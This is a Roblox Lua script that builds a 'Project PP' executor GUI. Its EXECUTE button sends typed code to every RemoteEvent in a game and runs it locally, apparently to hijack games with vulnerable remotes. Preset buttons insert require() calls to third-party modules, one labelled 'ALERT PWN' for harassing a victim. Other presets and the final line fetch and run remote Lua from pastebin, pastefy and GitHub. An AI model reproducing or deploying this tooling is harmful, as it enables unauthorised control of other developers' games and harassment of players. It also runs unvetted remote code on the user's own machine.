local player = game.Players.LocalPlayer
local pName = player.Name
local UIS = game:GetService("UserInputService")

local scr = Instance.new("ScreenGui")
scr.Name = "ProjectPP_Ultimate_DM"
scr.ResetOnSpawn = false
scr.Parent = player:WaitForChild("PlayerGui")

-- [ Main Frame - 600x350 เป๊ะ ] --
local main = Instance.new("Frame", scr)
main.Size = UDim2.new(0, 600, 0, 350)
main.Position = UDim2.new(0.5, -300, 0.5, -175)
main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
main.BorderSizePixel = 2
main.BorderColor3 = Color3.fromRGB(60, 60, 60)
main.Active = true -- จำเป็นสำหรับการลาก

-- [ Title & Description ] --
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(0, 400, 0, 30)
title.Position = UDim2.new(0, 15, 0, 8)
title.Text = "Project PP {Dark Mode}"
title.TextSize = 24
title.Font = Enum.Font.SourceSansBold
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local desc = Instance.new("TextLabel", main)
desc.Size = UDim2.new(0, 400, 0, 20)
desc.Position = UDim2.new(0, 15, 0, 33)
desc.Text = "private gui by pun_punPP102030"
desc.Font = Enum.Font.SourceSansItalic
desc.TextSize = 14
desc.TextColor3 = Color3.fromRGB(150, 150, 150)
desc.BackgroundTransparency = 1
desc.TextXAlignment = Enum.TextXAlignment.Left

-- [ Input Box Zone (With Scrolling) ] --
local inputFrame = Instance.new("ScrollingFrame", main)
inputFrame.Size = UDim2.new(0, 420, 0, 220)
inputFrame.Position = UDim2.new(0, 10, 0, 60)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 1
inputFrame.BorderColor3 = Color3.fromRGB(45, 45, 45)
inputFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
inputFrame.ScrollBarThickness = 4

local input = Instance.new("TextBox", inputFrame)
input.Size = UDim2.new(1, -10, 1, 0)
input.Position = UDim2.new(0, 5, 0, 0)
input.BackgroundTransparency = 1
input.Text = ""
input.TextSize = 16
input.MultiLine = true
input.TextWrapped = true
input.Font = Enum.Font.Code
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.TextXAlignment = Enum.TextXAlignment.Left
input.TextYAlignment = Enum.TextYAlignment.Top
input.ClearTextOnFocus = false

-- [ Require List Zone ] --
local scriptTitle = Instance.new("TextLabel", main)
scriptTitle.Size = UDim2.new(0, 150, 0, 30)
scriptTitle.Position = UDim2.new(0, 440, 0, 25)
scriptTitle.Text = "Require List"
scriptTitle.Font = Enum.Font.SourceSansBold
scriptTitle.TextSize = 18
scriptTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
scriptTitle.BackgroundTransparency = 1

local scriptFrame = Instance.new("ScrollingFrame", main)
scriptFrame.Size = UDim2.new(0, 150, 0, 280)
scriptFrame.Position = UDim2.new(0, 440, 0, 60)
scriptFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
scriptFrame.BorderSizePixel = 1
scriptFrame.BorderColor3 = Color3.fromRGB(45, 45, 45)
scriptFrame.CanvasSize = UDim2.new(0, 0, 0, 1500)
scriptFrame.ScrollBarThickness = 4

-- [ Action Buttons Zone (3 ปุ่มครบ!) ] --
local function createBtn(x, text, color)
    local btn = Instance.new("TextButton", main)
    btn.Size = UDim2.new(0, 133, 0, 50)
    btn.Position = UDim2.new(0, x, 0, 290)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(60, 60, 60)
    btn.Text = text
    btn.TextColor3 = color
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 18
    return btn
end

local execBtn = createBtn(10, "EXECUTE", Color3.fromRGB(0, 160, 255))
local clrBtn  = createBtn(153, "CLEAR", Color3.fromRGB(200, 200, 200))
local conBtn  = createBtn(296, "CONSOLE", Color3.fromRGB(255, 150, 0))

-- [ Script Data & Logic ] --
local scripts = {
    {Title="OWNERS SS", Code='require(92684888032460)({Owners = {"username"}})'},
    {Title="ALERT PWN", Code='require(10557341183).alert("VictimNameHere", "you got pwned kid")'},
    {Title="SPACE LIB", Code='require(5702244094).space("YourNameHere")'},
    {Title="EAGLE CORE", Code="require(6032524768).Eagle('Your Name Here')"},
    {Title="LOAD USER", Code='require(8705266136).load("Username")'},
    {Title="project broken", URL="https://pastebin.com/raw/NyJfL0ey"},
    {Title="ssp", URL="https://pastefy.app/XHqVeb0d/raw"}
}

local yOffset = 5
for _, s in ipairs(scripts) do
    local b = Instance.new("TextButton", scriptFrame)
    b.Size = UDim2.new(1, -10, 0, 35)
    b.Position = UDim2.new(0, 5, 0, yOffset)
    b.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    b.Text = s.Title
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Font = Enum.Font.SourceSansBold
    b.TextSize = 14
    b.BorderSizePixel = 0
    b.MouseButton1Click:Connect(function()
        if s.URL then
            input.Text = 'loadstring(game:HttpGet("'..s.URL..'",true))()'
        else
            input.Text = s.Code:gsub("username", pName):gsub("VictimNameHere", pName):gsub("YourNameHere", pName):gsub("Your Name Here", pName):gsub("Username", pName)
        end
    end)
    yOffset = yOffset + 40
end
scriptFrame.CanvasSize = UDim2.new(0, 0, 0, yOffset)

-- [ Functions ] --
execBtn.MouseButton1Click:Connect(function()
    if input.Text ~= "" then
        local payload = input.Text
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then pcall(function() v:FireServer(payload) end) end
        end
        local f = loadstring(payload) if f then task.spawn(f) end
    end
end)

clrBtn.MouseButton1Click:Connect(function() input.Text = "" end)

conBtn.MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F9, false, game)
end)

-- [ Smooth Drag System ] --
local dragging, dragInput, dragStart, startPos
main.InputBegan:Connect(function(i)
    if (i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch) then
        dragging = true dragStart = i.Position startPos = main.Position
        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
main.InputChanged:Connect(function(i)
    if (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then dragInput = i end
end)
UIS.InputChanged:Connect(function(i)
    if dragging and i == dragInput then
        local delta = i.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- [ Final ] --
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/popohoyo1029384756-hub/Project_PP_Classic_LoadingGui/refs/heads/main/PPPCLG.lua"))() end)
